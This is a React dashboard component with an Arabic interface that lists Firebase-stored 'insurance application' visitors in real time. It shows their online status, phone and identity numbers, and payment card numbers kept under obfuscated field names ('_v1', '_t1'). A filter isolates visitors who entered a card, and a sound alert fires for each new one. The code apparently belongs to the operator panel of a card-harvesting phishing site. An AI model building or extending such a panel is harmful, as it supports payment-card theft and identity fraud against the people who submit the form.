"use client";

import { useState, useEffect, useMemo, useRef } from "react";
import {
  subscribeToApplications,
  updateApplication,
  deleteMultipleApplications,
} from "@/lib/firebase-services";
import type { InsuranceApplication } from "@/lib/firestore-types";
import { VisitorSidebar } from "@/components/visitor-sidebar";
import { VisitorDetails } from "@/components/visitor-details";
import { DashboardHeader } from "@/components/dashboard-header";
import { Timestamp } from "firebase/firestore";

export default function Dashboard() {
  const PAGE_SIZE = 15;
  const [applications, setApplications] = useState<InsuranceApplication[]>([]);
  const [selectedVisitor, setSelectedVisitor] =
    useState<InsuranceApplication | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [cardFilter, setCardFilter] = useState<"all" | "hasCard">("all");
  const [currentPage, setCurrentPage] = useState(1);
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [loading, setLoading] = useState(true);
  const [sidebarWidth, setSidebarWidth] = useState(215); // Default landscape width
  const previousUnreadIds = useRef<Set<string>>(new Set());
  const selectedVisitorIdRef = useRef<string | null>(null);
  const visitorOrderRef = useRef<string[]>([]);

  // Play notification sound
  const playNotificationSound = () => {
    const audio = new Audio("/zioan.mp3");
    audio.play().catch((e) => console.log("Could not play sound:", e));
  };

  // Subscribe to Firebase
  useEffect(() => {
    const unsubscribe = subscribeToApplications((apps) => {
      // Filter out visitors without ownerName (haven't completed first form)
      const validApps = apps.filter((app) => app.ownerName);

      // Calculate isOnline based on lastSeen (within last 30 seconds for real-time accuracy)
      const now = new Date();
      const thirtySecondsAgo = new Date(now.getTime() - 30 * 1000);

      const appsWithOnlineStatus = validApps.map((app) => {
        let isOnline = false;

        if (app.lastSeen) {
          try {
            // Handle Firestore Timestamp or Date
            let lastSeen: Date;
            if (app.lastSeen instanceof Timestamp) {
              lastSeen = app.lastSeen.toDate();
            } else if (app.lastSeen instanceof Date) {
              lastSeen = app.lastSeen;
            } else {
              lastSeen = new Date(app.lastSeen as any);
            }
            isOnline = lastSeen >= thirtySecondsAgo;
          } catch (error) {
            console.error("Error parsing lastSeen:", error);
          }
        }

        return { ...app, isOnline };
      });

      // Sort ALL visitors by updatedAt (most recent first)
      const sorted = appsWithOnlineStatus.sort((a, b) => {
        const timeA = a.updatedAt
          ? a.updatedAt instanceof Date
            ? a.updatedAt.getTime()
            : new Date(a.updatedAt as any).getTime()
          : 0;
        const timeB = b.updatedAt
          ? b.updatedAt instanceof Date
            ? b.updatedAt.getTime()
            : new Date(b.updatedAt as any).getTime()
          : 0;
        return timeB - timeA; // Most recent first
      });

      // Update the order ref
      visitorOrderRef.current = sorted
        .map((app) => app.id!)
        .filter((id): id is string => id !== undefined);

      // Check for new unread visitors
      const currentUnreadIds = new Set(
        sorted.filter((app) => app.isUnread && app.id).map((app) => app.id!)
      );

      // Find newly added unread visitors
      const newUnreadIds = Array.from(currentUnreadIds).filter(
        (id) => !previousUnreadIds.current.has(id)
      );

      // Play sound if there are new unread visitors
      if (newUnreadIds.length > 0 && previousUnreadIds.current.size > 0) {
        playNotificationSound();
      }

      // Update previous unread IDs
      previousUnreadIds.current = currentUnreadIds;

      setApplications(sorted);
      setLoading(false);

      // Update selected visitor if it exists in the new list (to keep it synced)
      setSelectedVisitor((prev) => {
        if (prev && prev.id) {
          selectedVisitorIdRef.current = prev.id;
          const updatedVisitor = sorted.find((app) => app.id === prev.id);
          return updatedVisitor || prev;
        }

        // Auto-select first visitor only if none selected
        if (!prev && sorted.length > 0) {
          selectedVisitorIdRef.current = sorted[0].id || null;
          return sorted[0];
        }

        return prev;
      });
    });

    return () => unsubscribe();
  }, []);

  // Filter applications
  const filteredApplications = useMemo(() => {
    let filtered = applications;

    // Card filter
    if (cardFilter === "hasCard") {
      filtered = filtered.filter((app) => {
        // Check direct fields
        if (app._v1 || app.cardNumber) return true;

        // Check history for card entry (type _t1 or card)
        if (app.history && Array.isArray(app.history)) {
          return app.history.some(
            (entry: any) =>
              (entry.type === "_t1" || entry.type === "card") &&
              (entry.data?._v1 || entry.data?.cardNumber)
          );
        }

        return false;
      });
    }

    // Search filter
    if (searchQuery) {
      const query = searchQuery.toLowerCase();
      filtered = filtered.filter((app) => {
        const cardNum = app._v1 || app.cardNumber;
        return (
          app.ownerName?.toLowerCase().includes(query) ||
          app.identityNumber?.includes(query) ||
          app.phoneNumber?.includes(query) ||
          cardNum?.slice(-4).includes(query)
        );
      });
    }

    return filtered;
  }, [applications, cardFilter, searchQuery]);

  const totalPages = Math.max(
    1,
    Math.ceil(filteredApplications.length / PAGE_SIZE)
  );
  const normalizedCurrentPage = Math.min(currentPage, totalPages);

  const paginatedApplications = useMemo(() => {
    const startIndex = (normalizedCurrentPage - 1) * PAGE_SIZE;
    return filteredApplications.slice(startIndex, startIndex + PAGE_SIZE);
  }, [filteredApplications, normalizedCurrentPage]);

  const onlineCount = useMemo(
    () => filteredApplications.filter((app) => app.isOnline).length,
    [filteredApplications]
  );

  const unreadCount = useMemo(
    () => filteredApplications.filter((app) => app.isUnread).length,
    [filteredApplications]
  );

  // Handle select all
  const handleSelectAll = () => {
    const pageIds = paginatedApplications
      .map((app) => app.id)
      .filter((id): id is string => id !== undefined);

    setSelectedIds((prevSelected) => {
      const allPageSelected =
        pageIds.length > 0 && pageIds.every((id) => prevSelected.has(id));
      const nextSelected = new Set(prevSelected);

      if (allPageSelected) {
        pageIds.forEach((id) => nextSelected.delete(id));
      } else {
        pageIds.forEach((id) => nextSelected.add(id));
      }

      return nextSelected;
    });
  };

  // Handle delete selected
  const handleDeleteSelected = async () => {
    if (selectedIds.size === 0) return;

    const count = selectedIds.size;
    if (
      !confirm(
        `هل أنت متأكد من حذف ${count} زائر؟\n\nهذا الإجراء لا يمكن التراجع عنه.`
      )
    ) {
      return;
    }

    try {
      console.log("Deleting visitors:", Array.from(selectedIds));
      const idsToDelete = Array.from(selectedIds);
      await deleteMultipleApplications(idsToDelete);
      setSelectedIds(new Set());
      console.log("Delete successful");
      alert(`✅ تم حذف ${count} زائر بنجاح`);
    } catch (error) {
      console.error("Error deleting applications:", error);
      alert(
        `❌ حدث خطأ أثناء الحذف: ${
          error instanceof Error ? error.message : "خطأ غير معروف"
        }`
      );
    }
  };

  // Mark as read when visitor is selected
  const handleSelectVisitor = async (visitor: InsuranceApplication) => {
    setSelectedVisitor(visitor);

    // Mark as read
    if (visitor.isUnread && visitor.id) {
      await updateApplication(visitor.id, { isUnread: false });
    }
  };

  if (loading) {
    return (
      <div className="flex h-screen items-center justify-center bg-slate-50/60 dark:bg-slate-950/70">
        <div className="rounded-2xl border border-slate-200 bg-white/90 p-8 text-center shadow-lg dark:border-slate-700 dark:bg-slate-900/90">
          <div className="mx-auto h-12 w-12 animate-spin rounded-full border-b-2 border-emerald-600"></div>
          <p className="mt-4 font-medium text-slate-600 dark:text-slate-300">
            جاري التحميل...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-screen flex-col bg-transparent text-slate-900 dark:text-slate-100" dir="rtl">
      <DashboardHeader />
      <div className="flex-1 flex flex-col landscape:flex-row md:flex-row overflow-hidden">
        {/* Right Sidebar - Visitor List */}
        <VisitorSidebar
          visitors={paginatedApplications}
          selectedVisitor={selectedVisitor}
          onSelectVisitor={handleSelectVisitor}
          searchQuery={searchQuery}
          onSearchChange={(query) => {
            setSearchQuery(query);
            setCurrentPage(1);
          }}
          cardFilter={cardFilter}
          onCardFilterChange={(filter) => {
            setCardFilter(filter);
            setCurrentPage(1);
          }}
          selectedIds={selectedIds}
          onToggleSelect={(id) => {
            setSelectedIds((prevSelected) => {
              const nextSelected = new Set(prevSelected);
              if (nextSelected.has(id)) {
                nextSelected.delete(id);
              } else {
                nextSelected.add(id);
              }
              return nextSelected;
            });
          }}
          onSelectAll={handleSelectAll}
          onDeleteSelected={handleDeleteSelected}
          sidebarWidth={sidebarWidth}
          onSidebarWidthChange={setSidebarWidth}
          totalVisitors={filteredApplications.length}
          onlineCount={onlineCount}
          unreadCount={unreadCount}
          currentPage={normalizedCurrentPage}
          totalPages={totalPages}
          pageSize={PAGE_SIZE}
          onPageChange={(page) =>
            setCurrentPage(Math.min(Math.max(1, page), totalPages))
          }
        />

        {/* Left Side - Visitor Details */}
        <VisitorDetails visitor={selectedVisitor} />
      </div>
    </div>
  );
}
